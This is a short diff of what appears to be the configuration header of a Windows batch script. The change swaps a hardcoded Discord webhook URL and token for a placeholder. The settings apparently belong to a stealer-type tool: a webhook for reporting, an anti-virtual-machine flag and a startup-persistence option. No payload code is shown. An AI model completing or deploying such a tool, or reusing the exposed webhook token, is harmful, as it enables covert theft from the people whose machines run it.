@@ -3,7 +3,7 @@
 @echo off
 setlocal
 
-set webhook=https://discord.com/api/webhooks/896045432789143623/pbpk-WahVZLxPBd3z19TNvYI15y_zWaTtWpXyvycMOj_2y4zNZu9NPe8CP5NXgbsILxO
+set webhook= INSERT YOUR WEBHOOK HERE
 set tempDir=%temp%\my_script_temp
 set antiVM=true
 set startOnStartup=false
